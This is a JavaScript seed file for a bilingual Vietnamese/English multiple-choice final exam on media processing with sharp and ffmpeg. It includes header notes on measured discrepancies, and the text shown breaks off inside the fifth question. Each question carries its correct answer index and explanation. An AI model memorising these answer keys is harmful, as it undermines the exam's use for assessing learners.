/**
 * Media Processing — Final Exam (FE): 50 câu trắc nghiệm phủ cả 11 chương
 * (s00–s10).
 *
 * Đề tự soạn, bám sát `content/courses/media-processing/s00…s10`. MỌI con số,
 * mọi đoạn output và mọi thông báo lỗi trong đề đều CHẠY THẬT trên:
 *
 *   sharp 0.35.4 · libvips 8.18.6 (aom 3.15.0, webp 1.6.0, heif 1.23.2,
 *   mozjpeg 0826579) · ffmpeg 8.1.2 / ffprobe 8.1.2 (Homebrew, libx264 +
 *   libsvtav1 + libopus + libmp3lame + videotoolbox) · Node v22.21.0 ·
 *   darwin-arm64 (macOS 26.6.2, 10 nhân, sharp.concurrency() = 8).
 *
 * File mẫu là file TỰ SINH, không phải ảnh/video của dự án: ảnh 4032×3024 dựng
 * bằng `mandelbrot` + `noise` của lavfi (7.857.079 B JPEG), bốn bản sao của nó
 * mang EXIF Orientation 1/3/6/8, một avatar PNG 400×400, một "quả bom" PNG một
 * màu 16000×16000 (776.180 B), một GIF động 48 frame 480×270 từ `testsrc`, một
 * clip 10 s 720p và một clip 3 phút 360p từ `testsrc2`, cùng vài file WAV/MP3 từ
 * `sine`. Không đụng `uploads/`, không đụng R2/CDN.
 *
 * ⚠️ BẢY CHỖ MÁY KHÁC GIÁO TRÌNH, đã đo lại và ĐỀ THEO MÁY:
 *
 *   • Bài 1.4 nói thứ tự `.resize()` ↔ `.rotate()` đổi kết quả: resize trước
 *     thì trần 1200 áp lên chiều rộng ĐÃ LƯU nên ảnh dọc ra 900×1200, rotate
 *     trước thì ra 1200×1600. Trên sharp 0.35.4 CẢ HAI THỨ TỰ đều ra
 *     **1200×1600** — `.rotate()` không tham số là một CỜ LÚC NẠP, không phải
 *     một bước trong chuỗi (`sharp(src, { autoOrient: true })` cho đúng kết quả
 *     đó). Nên đề chỉ hỏi "gọi `.rotate()` không tham số", KHÔNG hỏi con số phụ
 *     thuộc thứ tự.
 *
 *   • Bài 2.2 nói một ràng buộc `height` áp lên CẢ DẢI và "ép 48 frame vào một
 *     dải cao 270px". Đo thật: `resize({ width: 240, height: 135 })` giữ nguyên
 *     `pages=48, pageHeight=135`; còn `resize({ width: 240, height: 60 })` trả
 *     về **`pages=2`** — frame bị VỨT chứ không bị ép, vì `fit:'cover'` mặc định
 *     CẮT cái dải. Kết luận của bài (resize chỉ theo width) vẫn đúng; đề dùng cơ
 *     chế ĐO ĐƯỢC.
 *
 *   • Bài 7.2 nói bỏ `-hls_playlist_type vod` thì playlist thiếu
 *     `#EXT-X-ENDLIST` nên player coi file đã xong là luồng live. Trên ffmpeg
 *     8.1.2, **CẢ HAI** playlist đều kết thúc bằng `#EXT-X-ENDLIST`; khác biệt
 *     duy nhất là dòng `#EXT-X-PLAYLIST-TYPE:VOD` (và mặc định là
 *     `#EXT-X-VERSION:6`, không phải 3). Đề KHÔNG có câu nào dựa vào việc thiếu
 *     ENDLIST.
 *
 *   • Bài 4.2 trích thông báo lỗi của bug khoảng trắng là `Unable to find a
 *     suitable output format for ':measured_I=…'`. ffmpeg 8.1.2 in ra
 *     `Error initializing the muxer for :measured_I=…: Invalid argument` rồi
 *     `Error opening output file :measured_I=…`. Đề dùng nguyên văn của máy.
 *
 *   • Bài 1.2 liệt kê `pages: 1` trong kết quả `metadata()` và dạy tự đảo trục
 *     khi `orientation >= 5`. sharp 0.35.4 **không trả `pages`** cho một JPEG
 *     tĩnh, và thêm `mediaType`, `isPalette`, `resolutionUnit`, cùng
 *     **`autoOrient: { width, height }`** vốn đã là kích thước SAU xoay — nên
 *     hàm đảo trục viết tay không còn cần thiết.
 *
 *   • Bài 0.1 và 2.3 nói AVIF encode chậm hơn WebP khoảng 10–13×. Đo thật trên
 *     darwin-arm64 với libaom 3.15.0: AVIF q50 = 623 ms so với WebP q80 =
 *     193 ms, tức **3,2×**. Chiều thì đúng, độ lớn thì không — nên đề chỉ hỏi
 *     cái bẫy THANG QUALITY (tái hiện được: AVIF q80 = 527 KB so với WebP q80 =
 *     264 KB), không hỏi tỉ số tốc độ.
 *
 *   • Bài 3.3 có bảng preset với kích thước giảm đều từ `ultrafast` xuống
 *     `veryslow`. Đo thật trên clip 10 s 720p `testsrc2` ở crf 23: `veryfast`
 *     (3.045.931 B) ra **NHỎ HƠN** `faster`, `fast`, `medium` và `slow`. Chỉ
 *     THỜI GIAN encode là đơn điệu (228 → 1.316 ms). Đề chỉ hỏi thời gian và cơ
 *     chế, không hỏi thứ tự kích thước.
 *
 * ⚠️ NHỮNG CHỖ KHÔNG ĐO ĐƯỢC / SỐ ĐO KHÔNG ỔN ĐỊNH ⇒ ĐÃ TRÁNH RA ĐỀ:
 *   • Tỉ số 318× của `-ss` sau `-i`: máy này cho 59 ms vs 548 ms (9,3×) trên
 *     clip 3 phút 360p, và tỉ số đó tăng theo thời lượng lẫn độ phân giải. Đề
 *     hỏi CƠ CHẾ và trích đúng hai con số đã đo.
 *   • Bộ lọc `thumbnail=300`: 94 ms so với 69 ms của `-ss` thẳng trên clip tổng
 *     hợp — không tái hiện được khoảng cách 2,8 s vs 0,09 s của giáo trình.
 *   • "PNG thắng WebP trên ảnh chụp màn hình": trên file mẫu của tôi WebP ra
 *     86.714 B còn PNG 409.427 B. Không tái hiện được ⇒ không ra đề.
 *   • Mọi phép đo THỜI GIAN CHẠY SONG SONG (concurrency, p99 dưới tải): máy này
 *     đang có agent khác chạy, nên tôi KHÔNG đo song song lần nào.
 *   • Các dữ kiện phía trình duyệt và giá dịch vụ (Safari chỉ giải mã 4:2:0,
 *     hls.js, thuộc tính `<video>`, giá R2/S3, mốc LUFS của Spotify) là dữ kiện
 *     TRÍCH DẪN, không đo được ở đây — những câu chạm tới chúng đều hỏi cơ chế
 *     hoặc hỏi nửa đo được của vấn đề.
 *
 * Phân bố câu theo chương:
 *   s00 giới thiệu ................ 3   (q1–q3)
 *   s01 nền tảng Sharp ............ 8   (q4–q11)
 *   s02 Sharp trong production .... 6   (q12–q17)
 *   s03 FFmpeg từ Node ............ 7   (q18–q24)
 *   s04 âm thanh .................. 6   (q25–q30)
 *   s05 đường ống upload .......... 5   (q31–q35)
 *   s06 chi phí ................... 4   (q36–q39)
 *   s07 streaming ................. 4   (q40–q43)
 *   s08 live ...................... 3   (q44–q46)
 *   s09 chẩn đoán ................. 2   (q47–q48)
 *   s10 tổng kết .................. 2   (q49–q50)
 *
 * Phân bố vị trí đáp án (kiểm bằng lệnh dưới): A 12 · B 13 · C 13 · D 12.
 *   node -e "import('./content/exams/MEDIA-PROCESSING-FE.mjs').then(m=>{const d={};m.default.exams[0].questions.forEach(q=>q.correctIndexes.forEach(c=>d[c]=(d[c]||0)+1));console.log(d)})"
 *
 * Seed: node scripts/academy-seed-exam.mjs --file ./content/exams/MEDIA-PROCESSING-FE.mjs --apply
 */
import { B, EX, code, c, mcq } from './_lib/media-exam-kit.mjs';

const INSTRUCTIONS =
  '<div class="ml-en">' +
  '<p><b>Final Exam</b> — 50 multiple-choice questions across all eleven chapters, from "which format is right for this job" to "both real bugs in this course returned HTTP 200". Many questions show a real terminal transcript or a real measurement; every one of those came from actually running the command on sharp 0.35.4 / libvips 8.18.6 / ffmpeg 8.1.2, so read the transcript rather than the intuition.</p>' +
  '<p>Three habits pay off here. First, ask the file what it is: <code>metadata()</code> and <code>ffprobe</code> read a header in under a millisecond and settle most of these questions before any theorising. Second, separate the two budgets — bytes on the wire and pixels in RAM are different numbers, and only the second one predicts an out-of-memory. Third, remember that in media a green exit code proves almost nothing: the loudness bug, the lost GIF frames and the sideways photo all produced a structurally valid file and a successful return.</p>' +
  '<p>You can flag a question and come back to it. The timer auto-submits when it ends, and every question shows a bilingual explanation afterwards.</p>' +
  '</div>' +
  '<div class="ml-vi">' +
  '<p><b>Thi cuối khoá</b> — 50 câu trắc nghiệm phủ cả mười một chương, từ "format nào đúng cho việc này" tới "cả hai bug thật của khoá đều trả HTTP 200". Nhiều câu cho sẵn một đoạn terminal thật hoặc một con số đo thật; mọi thứ loại đó đều lấy từ việc chạy thật câu lệnh trên sharp 0.35.4 / libvips 8.18.6 / ffmpeg 8.1.2, nên hãy đọc đoạn terminal thay vì đoán theo cảm tính.</p>' +
  '<p>Ba thói quen giúp ích ở đây. Một, hãy HỎI FILE xem nó là cái gì: <code>metadata()</code> và <code>ffprobe</code> đọc header trong chưa tới một mili giây và giải quyết phần lớn những câu này trước khi bạn kịp suy luận. Hai, tách bạch hai ngân sách — byte trên dây và pixel trong RAM là hai con số khác nhau, và chỉ con số thứ hai mới dự báo được một cú tràn bộ nhớ. Ba, nhớ rằng trong media một mã thoát bằng 0 gần như không chứng minh được gì: bug độ to, những frame GIF bị mất và tấm ảnh nằm nghiêng đều sinh ra một file hợp lệ về cấu trúc và một lượt trả về thành công.</p>' +
  '<p>Bạn có thể đánh dấu câu để quay lại sau. Hết giờ hệ thống tự nộp, và sau khi nộp mỗi câu đều có lời giải thích song ngữ.</p>' +
  '</div>';

export default {
  course: { slug: 'media-processing' },
  exams: [
    {
      kind: 'FE',
      code: 'FE',
      source: 'SAMPLE',
      sortOrder: 4,
      title: B(
        'Final Exam — the whole Media Processing course (50 questions)',
        'Thi cuối khoá — toàn bộ khoá Media Processing (50 câu)',
      ),
      description: B(
        'Fifty multiple-choice questions covering all eleven chapters: which format fits which job and where the encoding should happen, Sharp\'s lazy pipeline and its pixel budget, EXIF rotation and resize fit modes, SVG as stored XSS and the animation frames you lose in silence, calling FFmpeg without a shell, seeking, transcoding and the flags that decide whether a file plays at all, audio through pipes and two-pass loudness, the single upload door and the keys it builds, what CPU actually costs, progressive versus HLS delivery, the three latency tiers of live media, and a method for diagnosing failures that return success.',
        'Năm mươi câu trắc nghiệm phủ cả mười một chương: format nào hợp việc nào và nên xử lý ở đâu, pipeline lười của Sharp và ngân sách pixel của nó, xoay EXIF và các fit mode của resize, SVG như một lỗ stored XSS và những frame ảnh động mất đi trong im lặng, gọi FFmpeg mà không qua shell, tua, transcode và những cờ quyết định file có phát được hay không, âm thanh chảy qua pipe và chuẩn hoá độ to hai lượt, một cửa upload duy nhất và những key nó dựng, CPU thực sự tốn bao nhiêu, phát progressive so với HLS, ba bậc độ trễ của media trực tiếp, và một phương pháp chẩn đoán những lỗi trả về thành công.',
      ),
      durationMinutes: 60,
      totalPoints: 10,
      passMark: 5,
      shuffleQuestions: true,
      shuffleOptions: false,
      isPublished: true,
      instructions: INSTRUCTIONS,
      questions: [

        /* ── Mục 0 — format, và xử lý ở đâu (3 câu) ──────────────────────── */

        // q1 · đáp án 0
        mcq({
          prompt: B(
            'A colleague says "we serve MP4, so we are not using HLS". What are the three separate concepts being conflated there?',
            'Một đồng nghiệp nói "bọn mình phục vụ MP4, nên không dùng HLS". Ba khái niệm riêng biệt nào đang bị gộp lại ở đó?',
          ),
          options: [
            B(
              'Container (MP4, WebM, MOV — the wrapper holding tracks and metadata), codec (H.264, VP9, AV1 — how the bytes are compressed), and delivery (one HTTP GET versus a manifest plus chunks). The same MP4 container can hold H.264 or AV1, and an HLS stream is normally made of MPEG-TS or fragmented-MP4 segments, so "MP4" answers only the first of the three.',
              'Container (MP4, WebM, MOV — cái vỏ chứa các track và metadata), codec (H.264, VP9, AV1 — cách các byte được nén), và cách phát (một lượt HTTP GET so với một manifest cộng các mẩu). Cùng một container MP4 chứa được H.264 hoặc AV1, và một luồng HLS thường gồm các segment MPEG-TS hoặc fragmented-MP4, nên chữ "MP4" chỉ trả lời được cái thứ nhất trong ba.',
            ),
            B(
              'Resolution (720p, 1080p, 4K), frame rate (24, 30, 60 fps) and bit depth (8-bit, 10-bit). These three decide the file size, and picking a container is downstream of all of them because the container is chosen from the resolution.',
              'Độ phân giải (720p, 1080p, 4K), tốc độ khung hình (24, 30, 60 fps) và độ sâu bit (8-bit, 10-bit). Ba thứ này quyết định kích thước file, và việc chọn container nằm sau cả ba vì container được chọn theo độ phân giải.',
            ),
            B(
              'File extension, MIME type and magic bytes. All three describe the same thing at three layers of the stack, and a mismatch between them is exactly what "MP4 versus HLS" means in practice.',
              'Đuôi file, MIME type và magic byte. Cả ba mô tả cùng một thứ ở ba tầng của stack, và việc chúng lệch nhau chính là ý nghĩa thực tế của "MP4 so với HLS".',
            ),
            B(
              'Upload-time processing, background processing and on-demand processing. HLS belongs to the third because the manifest is generated when the first viewer asks for it, while a plain MP4 is produced at upload time.',
              'Xử lý lúc upload, xử lý nền và xử lý theo yêu cầu. HLS thuộc loại thứ ba vì manifest được sinh ra khi người xem đầu tiên hỏi tới, còn một MP4 thường được tạo ngay lúc upload.',
            ),
          ],
          correct: 0,
          explanation: EX(
            'The whole chapter rests on keeping these apart. A <b>container</b> is the wrapper — <code>.mp4</code>, <code>.webm</code>, <code>.mov</code> — holding one or more tracks plus an index. A <b>codec</b> is the compression of one track: H.264 (universal), H.265 (~50% smaller, patent-encumbered on the web), VP9 (no Safari), AV1 (royalty-free, slow encoder). A <b>delivery method</b> is how the browser fetches it: one Range-served HTTP GET, or a manifest plus segments (HLS, DASH). They are orthogonal — the exam ladder in Chapter 7 produces H.264 inside MPEG-TS segments described by an <code>.m3u8</code>, which is simultaneously "H.264", "not MP4" and "HLS". Option 2 lists real parameters but none of them is the container/codec/delivery split. Option 3 lists three ways of <em>identifying</em> a file, which is Chapter 9\'s diagnosis material, not this. Option 4 lists the three architectures from Lesson 0.2, which is about <em>when</em> the work runs, not about what the artifact is.',
            'Cả chương này dựa trên việc giữ ba thứ đó tách nhau. <b>CONTAINER</b> là cái vỏ — <code>.mp4</code>, <code>.webm</code>, <code>.mov</code> — chứa một hay nhiều track cộng một chỉ mục. <b>CODEC</b> là cách nén của một track: H.264 (phổ dụng), H.265 (nhỏ hơn ~50%, vướng bằng sáng chế trên web), VP9 (không có Safari), AV1 (miễn phí bản quyền, encoder chậm). <b>CÁCH PHÁT</b> là cách trình duyệt lấy nó về: một lượt HTTP GET phục vụ theo Range, hay một manifest cộng các segment (HLS, DASH). Ba thứ vuông góc nhau — bậc thang ở Chương 7 sinh ra H.264 nằm trong các segment MPEG-TS được mô tả bởi một file <code>.m3u8</code>, tức đồng thời là "H.264", "không phải MP4" và "HLS". Phương án 2 liệt kê những tham số có thật nhưng không cái nào là bộ ba container/codec/cách phát. Phương án 3 liệt kê ba cách NHẬN DẠNG một file, vốn là chất liệu chẩn đoán của Chương 9, không phải chuyện này. Phương án 4 liệt kê ba kiến trúc của Bài 0.2, vốn nói về việc chạy KHI NÀO, không nói hiện vật là cái gì.',
          ),
        }),

        // q2 · đáp án 2
        mcq({
          prompt: B(
            'A user posts a 60-second phone clip. Where should the transcode run, and what is the argument that settles it?',
            'Một người dùng đăng một clip điện thoại 60 giây. Việc transcode nên chạy ở đâu, và lập luận nào chốt được điều đó?',
          ),
          options: [
            B(
              'Upload-time, inside the request handler, because that guarantees the URL you return is already playable and saves you from having to model a processing state in the database at all.',
              'Ngay lúc upload, bên trong request handler, vì như vậy bảo đảm URL bạn trả về đã phát được và giúp bạn khỏi phải mô hình hoá một trạng thái "đang xử lý" trong cơ sở dữ liệu.',
            ),
            B(
              'In the browser, with WebCodecs, because the client already holds the file and shipping the encode to the user\'s device removes the server cost entirely for every upload path.',
              'Trong trình duyệt, bằng WebCodecs, vì client vốn đã giữ file và đẩy việc encode sang thiết bị người dùng sẽ xoá sạch chi phí máy chủ trên mọi đường upload.',
            ),
            B(
              'A background job, always — write the raw file to storage, return a placeholder immediately, and let a worker encode. A video transcode is tens of seconds of CPU (measured here: 922 ms just to re-encode a <em>ten-second</em> 720p clip at preset medium), and a request handler held for that long is a hung POST from the browser\'s point of view.',
              'Một job nền, luôn luôn — ghi file thô vào kho, trả ngay một URL tạm, rồi để một worker encode. Một lượt transcode video là hàng chục giây CPU (đo tại đây: 922 ms chỉ để encode lại một clip 720p dài <em>mười giây</em> ở preset medium), và một request handler bị giữ lâu như vậy, dưới góc nhìn của trình duyệt, là một lượt POST bị treo.',
            ),
            B(
              'On-demand behind a CDN, because most uploads are never viewed and encoding lazily means you only pay for the clips somebody actually opens, which is the cheapest of the three architectures.',
              'Theo yêu cầu, đằng sau một CDN, vì hầu hết bản upload không bao giờ được xem và encode lười nghĩa là bạn chỉ trả tiền cho những clip có người thật sự mở, đó là kiến trúc rẻ nhất trong ba.',
            ),
          ],
          correct: 2,
          explanation: EX(
            'Video is the one case with no judgement call in it. Measured on this machine, re-encoding a <em>10-second</em> 720p clip at <code>-preset medium</code> took 922 ms; a 60-second phone clip at a realistic resolution is tens of seconds. Holding a request handler that long ties up a worker, and the browser shows a hung POST. So: write the raw bytes to storage, insert a row with a pending status, enqueue, return. Option 1 is exactly the trap Lesson 0.2 names — and note that avoiding the processing state is not a saving, because you still need FAILED and ORPHANED states (Lesson 5.3) whatever you do. Option 2 moves the cost to the client but makes the output uncontrollable: you now accept whatever codec, profile and pixel format the device produced, which is how the Safari black-screen bug (Lesson 3.3) reaches production. Option 4 is a real architecture for <em>images</em>, but on-demand video means the first viewer waits for the whole transcode, and there is no cache to hide behind on the first play.',
            'Video là trường hợp duy nhất không có chỗ cho phán đoán. Đo trên máy này, encode lại một clip 720p dài <em>10 giây</em> ở <code>-preset medium</code> mất 922 ms; một clip điện thoại 60 giây ở độ phân giải thực tế là hàng chục giây. Giữ một request handler lâu như vậy là chiếm mất một worker, và trình duyệt thì hiện một lượt POST treo. Nên: ghi byte thô vào kho, chèn một dòng với trạng thái chờ, đẩy vào hàng đợi, trả về. Phương án 1 đúng là cái bẫy mà Bài 0.2 đã nêu — và lưu ý rằng né được trạng thái xử lý cũng không phải khoản tiết kiệm, vì dù làm gì bạn vẫn cần trạng thái FAILED và ORPHANED (Bài 5.3). Phương án 2 dời chi phí sang client nhưng làm output mất kiểm soát: bạn nhận bất cứ codec, profile và pixel format nào thiết bị sinh ra, và đó chính là đường mà bug màn hình đen của Safari (Bài 3.3) đi vào production. Phương án 4 là một kiến trúc có thật cho ẢNH, nhưng video theo yêu cầu nghĩa là người xem đầu tiên chờ trọn lượt transcode, và ở lần phát đầu thì không có cache nào để nấp.',
          ),
        }),

        // q3 · đáp án 1
        mcq({
          prompt: B(
            'Two WAV files were generated from the same 5-second tone and measured on disk:' +
              code('tone-16k-mono-5s.wav      160,078 bytes\ntone-44k-stereo-5s.wav    882,078 bytes') +
              'What produces the 5.5× gap, and what does it tell you about a voice-note feature?',
            'Hai file WAV được sinh từ cùng một tiếng tone 5 giây và đo trên đĩa:' +
              code('tone-16k-mono-5s.wav      160.078 byte\ntone-44k-stereo-5s.wav    882.078 byte') +
              'Cái gì tạo ra khoảng cách 5,5×, và nó nói gì về một tính năng tin nhắn thoại?',
          ),
          options: [
            B(
              'The 44.1 kHz file uses a better encoder, so it keeps detail the 16 kHz one throws away. A voice note should therefore be recorded at 44.1 kHz and only downsampled at playback time, when the device knows what it can render.',
              'File 44,1 kHz dùng một bộ encode tốt hơn nên giữ được chi tiết mà file 16 kHz vứt đi. Vậy tin nhắn thoại nên thu ở 44,1 kHz và chỉ hạ tần số lúc phát, khi thiết bị đã biết nó dựng được tới đâu.',
            ),
            B(
              'Uncompressed size is <code>sampleRate × bitDepth/8 × channels × seconds</code>: 16000×2×1×5 = 160,000 and 44100×2×2×5 = 882,000, plus a 78-byte WAV header in both cases. Nyquist says 16 kHz already carries everything up to 8 kHz and speech has almost no energy above that, so for a voice note the extra 722 KB buys nothing — the second channel is a duplicated microphone and the extra rate describes silence.',
              'Kích thước không nén là <code>sampleRate × bitDepth/8 × channels × giây</code>: 16000×2×1×5 = 160.000 và 44100×2×2×5 = 882.000, cộng một header WAV 78 byte ở cả hai. Nyquist nói 16 kHz đã mang được mọi thứ tới 8 kHz mà tiếng nói gần như không có năng lượng trên mức đó, nên với một tin nhắn thoại thì 722 KB thêm không mua được gì — kênh thứ hai chỉ nhân đôi một cái micro và phần tần số thêm chỉ mô tả sự im lặng.',
            ),
            B(
              'WAV stores a full frequency table per channel, so a stereo file carries two tables and the size roughly doubles for that reason alone; the sample rate contributes only the remaining factor. A voice note should stay mono but can safely use any sample rate.',
              'WAV lưu một bảng tần số đầy đủ cho mỗi kênh, nên file stereo mang hai bảng và riêng vì lý do đó kích thước đã tăng gấp đôi; tần số lấy mẫu chỉ đóng góp phần hệ số còn lại. Một tin nhắn thoại nên giữ mono nhưng dùng tần số lấy mẫu nào cũng an toàn.',
            ),
            B(
              'The gap comes from the WAV container overhead, which scales with the number of chunks written. Compressing both to MP3 removes it entirely, so the right response is to store MP3 and stop reasoning about sample rate and channels at all.',
              'Khoảng cách đến từ phần phụ trội của container WAV, vốn tăng theo số chunk được ghi. Nén cả hai sang MP3 xoá sạch nó, nên phản ứng đúng là lưu MP3 và thôi hẳn việc suy nghĩ về tần số lấy mẫu và số kênh.',
            ),
          ],
          correct: 1,
          explanation: EX(
            'Measured, and the formula predicts it to the byte: 16000 × 2 × 1 × 5 = 160,000 against a 160,078-byte file, and 44100 × 2 × 2 × 5 = 882,000 against 882,078 — the same 78-byte header in both. The same check on an 8-second source gave 256,078 / 512,078 / 705,678 / 1,411,278 bytes for the four rate-and-channel combinations, all matching. The consequence for speech is Nyquist: a rate of <i>N</i> represents frequencies up to <i>N</i>/2, so 16 kHz covers everything up to 8 kHz, and human speech has almost no energy above that. Option 1 inverts the rule — upsampling invents nothing, exactly like upscaling an image. Option 3 invents a "frequency table"; PCM is literally a list of amplitude samples with no such structure. Option 4 mistakes the header for the payload: the header is 78 bytes of an 882 KB file, and switching to MP3 does not remove the question, it just moves it to the bitrate knob.',
            'Đo thật, và công thức dự báo đúng tới từng byte: 16000 × 2 × 1 × 5 = 160.000 so với file 160.078 byte, và 44100 × 2 × 2 × 5 = 882.000 so với 882.078 — cùng một header 78 byte ở cả hai. Cũng phép kiểm đó trên một nguồn 8 giây cho 256.078 / 512.078 / 705.678 / 1.411.278 byte cho bốn tổ hợp tần số-và-kênh, khớp cả bốn. Hệ quả với tiếng nói là Nyquist: tần số <i>N</i> biểu diễn được các tần tới <i>N</i>/2, nên 16 kHz bao được mọi thứ tới 8 kHz, mà tiếng nói con người gần như không có năng lượng trên mức đó. Phương án 1 đảo ngược quy tắc — upsample không bịa ra được gì, y hệt việc phóng to một tấm ảnh. Phương án 3 bịa ra một "bảng tần số"; PCM đúng nghĩa đen là một danh sách mẫu biên độ, không có cấu trúc nào như vậy. Phương án 4 nhầm header với phần dữ liệu: header là 78 byte trong một file 882 KB, và đổi sang MP3 không xoá được câu hỏi, nó chỉ dời câu hỏi sang cái núm bitrate.',
          ),
        }),

        /* ── Chương 1 — nền tảng Sharp (8 câu) ───────────────────────────── */

        // q4 · đáp án 3
        mcq({
          prompt: B(
            'A script printed RSS around a Sharp pipeline on a 7.86 MB, 4032×3024 JPEG:' +
              code("trước            88 MB\nsau khi chain    88 MB\nsau toBuffer     113 MB   output 264 KB") +
              'What does the flat middle line prove?',
            'Một script in RSS quanh một chuỗi Sharp trên ảnh JPEG 7,86 MB, 4032×3024:' +
              code("trước            88 MB\nsau khi chain    88 MB\nsau toBuffer     113 MB   output 264 KB") +
              'Dòng giữa không đổi chứng minh điều gì?',
          ),
          options: [
            B(
              'That libvips decoded the image into a shared memory pool that <code>process.memoryUsage().rss</code> cannot see, which is why RSS only moves once the buffer is copied back into the JavaScript heap at the end.',
              'Rằng libvips đã giải mã ảnh vào một vùng nhớ chung mà <code>process.memoryUsage().rss</code> không nhìn thấy, và đó là lý do RSS chỉ nhúc nhích khi buffer được chép ngược về heap của JavaScript ở bước cuối.',
            ),
            B(
              'That the resize was skipped because the source was already narrower than the target, so no pixels needed to move and only the encode at the end allocated anything.',
              'Rằng bước resize đã bị bỏ qua vì nguồn vốn đã hẹp hơn đích, nên không pixel nào cần dịch chuyển và chỉ có bước encode ở cuối là có cấp phát gì đó.',
            ),
            B(
              'That the JPEG decoder is lazy per-scan, so a baseline JPEG costs nothing until the last scan is requested; a progressive JPEG would have shown the jump at the chain line instead.',
              'Rằng bộ giải mã JPEG lười theo từng scan, nên một JPEG baseline không tốn gì tới khi scan cuối được yêu cầu; một JPEG progressive sẽ cho thấy cú nhảy ngay ở dòng chuỗi.',
            ),
            B(
              'That <code>.resize().rotate().webp()</code> did no work at all — each method returns the same instance and only queues an instruction. Decoding, transforming and encoding all happen inside <code>toBuffer()</code>, which is where the +25 MB and all the CPU appear, and which is therefore the call you must wrap in <code>try</code> and the cost your concurrency limit must be sized against.',
              'Rằng <code>.resize().rotate().webp()</code> chưa làm việc gì cả — mỗi method trả về chính instance đó và chỉ xếp hàng một chỉ thị. Giải mã, biến đổi và encode đều xảy ra bên trong <code>toBuffer()</code>, nơi +25 MB và toàn bộ CPU hiện ra, và vì thế đó là lời gọi bạn phải bọc trong <code>try</code> và là chi phí mà giới hạn concurrency của bạn phải cân theo.',
            ),
          ],
          correct: 3,
          explanation: EX(
            'Sharp\'s transform methods return <code>this</code> and append to an instruction list; nothing is decoded until an output call. The measurement shows it directly — building the chain moved RSS by 0 MB, and <code>toBuffer()</code> moved it by 25 MB while producing a 264 KB file. Three practical consequences follow, and all three are exam material: errors surface at the <code>await</code>, not at <code>.resize()</code>; a pipeline that has produced output is not safe to reuse, so <code>clone()</code> is the tool for many variants; and the memory that matters is <code>width × height × channels</code> at output time, which is what a concurrency gate is sized against. Option 1 is wrong on the mechanism — libvips allocations are ordinary process memory and RSS does see them, which is exactly why the third line moves. Option 2 is false here: the source is 4032 px wide against a 1200 px target, so the resize very much ran. Option 3 invents per-scan laziness; libvips streams in horizontal strips, but that streaming happens <em>during</em> <code>toBuffer()</code>, not before it.',
            'Các method biến đổi của Sharp trả về <code>this</code> và nối thêm vào một danh sách chỉ thị; không gì được giải mã cho tới một lời gọi output. Phép đo cho thấy điều đó trực tiếp — dựng chuỗi làm RSS đổi 0 MB, còn <code>toBuffer()</code> làm nó đổi 25 MB trong khi sinh ra một file 264 KB. Ba hệ quả thực dụng theo sau, và cả ba đều là chất liệu ra đề: lỗi hiện ra ở cái <code>await</code>, không phải ở <code>.resize()</code>; một pipeline đã sinh output thì không an toàn để tái dùng, nên <code>clone()</code> là công cụ cho nhiều variant; và phần bộ nhớ đáng kể là <code>width × height × channel</code> ở thời điểm output, đó chính là cái mà một cổng concurrency phải cân theo. Phương án 1 sai ở cơ chế — cấp phát của libvips là bộ nhớ tiến trình bình thường và RSS có thấy chúng, đó đúng là lý do dòng thứ ba nhúc nhích. Phương án 2 sai ở đây: nguồn rộng 4032 px so với đích 1200 px, nên bước resize chắc chắn đã chạy. Phương án 3 bịa ra sự lười theo từng scan; libvips có chảy dòng theo dải ngang, nhưng việc chảy đó diễn ra TRONG <code>toBuffer()</code>, không phải trước nó.',
          ),
        }),

        // q5 · đáp án 1
        mcq({
          prompt: B(
            'This code never enters the <code>catch</code>, even for a buffer that is not an image:' +
              code("try {\n  const p = sharp(buf).resize(800).webp()\n} catch (err) {\n  return res.status(400).json({ error: err.message })\n}\nconst out = await p.toBuffer()") +
              'Why, and what does the real error say?',
            'Đoạn mã này không bao giờ vào <code>catch</code>, kể cả với một buffer không phải ảnh:' +
              code("try {\n  const p = sharp(buf).resize(800).webp()\n} catch (err) {\n  return res.status(400).json({ error: err.message })\n}\nconst out = await p.toBuffer()") +
              'Vì sao, và lỗi thật nói gì?',
          ),
          options: [
            B(
              'Sharp validates asynchronously in a worker thread, so the rejection arrives on the next tick and a synchronous <code>try</code> can never observe it; the fix is to add a <code>process.on(\'unhandledRejection\')</code> handler that converts it into a 400.',
              'Sharp kiểm tra bất đồng bộ trong một worker thread, nên lời từ chối tới ở tick sau và một <code>try</code> đồng bộ không bao giờ quan sát được nó; cách vá là thêm một handler <code>process.on(\'unhandledRejection\')</code> để đổi nó thành một mã 400.',
            ),
            B(
              'Nothing has been decoded yet — the chain only queued instructions, so the constructor accepted the buffer without looking at it. The throw happens at the output call: measured, <code>await sharp(Buffer.from(\'this is not an image\')).resize(800).webp().toBuffer()</code> rejects with <code>Input buffer contains unsupported image format</code>. Wrap the <code>await</code>, not the chain.',
              'Chưa có gì được giải mã cả — chuỗi mới chỉ xếp hàng chỉ thị, nên constructor nhận buffer mà không hề nhìn vào nó. Cú throw xảy ra ở lời gọi output: đo thật, <code>await sharp(Buffer.from(\'this is not an image\')).resize(800).webp().toBuffer()</code> bị từ chối với <code>Input buffer contains unsupported image format</code>. Hãy bọc cái <code>await</code>, không phải cái chuỗi.',
            ),
            B(
              'The constructor swallows decode errors and substitutes a 1×1 transparent placeholder so a pipeline never breaks mid-request; the placeholder is what reaches <code>toBuffer()</code>, which is why no error is ever raised anywhere.',
              'Constructor nuốt lỗi giải mã và thay bằng một ảnh 1×1 trong suốt để một pipeline không bao giờ gãy giữa chừng một request; chính cái ảnh thay thế đó tới được <code>toBuffer()</code>, và đó là lý do không lỗi nào được ném ra ở đâu cả.',
            ),
            B(
              'The <code>webp()</code> call resets the error state that <code>resize()</code> recorded, because output-format methods rebuild the instruction list from scratch; putting <code>webp()</code> before <code>resize()</code> makes the <code>catch</code> fire correctly.',
              'Lời gọi <code>webp()</code> xoá trạng thái lỗi mà <code>resize()</code> đã ghi nhận, vì các method định dạng output dựng lại danh sách chỉ thị từ đầu; đặt <code>webp()</code> trước <code>resize()</code> sẽ làm <code>catch</code> chạy đúng.',
            ),
          ],
          correct: 1,
          explanation: EX(
